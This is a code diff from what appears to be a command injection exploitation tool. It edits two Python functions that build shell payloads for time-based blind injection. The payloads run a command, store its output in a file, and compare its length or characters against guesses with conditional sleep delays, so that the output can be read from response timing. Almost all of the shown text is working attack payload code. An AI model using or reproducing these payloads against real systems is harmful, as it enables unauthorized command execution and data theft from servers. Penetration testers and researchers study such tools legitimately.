@@ -122,9 +122,9 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
               "str=$("+ cmd + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
               "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
               "str1=${#str}" + separator + " "
-              "if [ " + str(j) + " != ${str1} ] " + separator + " "
-              "then sleep 0 " + separator +
-              "else sleep " + str(delay) + separator +
+              "if [ " + str(j) + " != ${str1} ]" + separator + " "
+              "then sleep 0 " + separator + " "
+              "else sleep " + str(delay) + separator + " "
               "fi "
               )
     
@@ -287,10 +287,10 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
   
   if separator == ";" :
     payload = (separator + " "
-              "str=$(cat " + OUTPUT_TEXTFILE + ") " + separator +
-              "if [ " + str(ascii_char) + " != ${str} ]" + separator +
-              "then sleep 0" + separator +
-              "else sleep " + str(delay) + separator +
+              "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
+              "if [ " + str(ascii_char) + " != ${str} ]" + separator + " "
+              "then sleep 0" + separator + " "
+              "else sleep " + str(delay) + separator + " "
               "fi "
               )
     
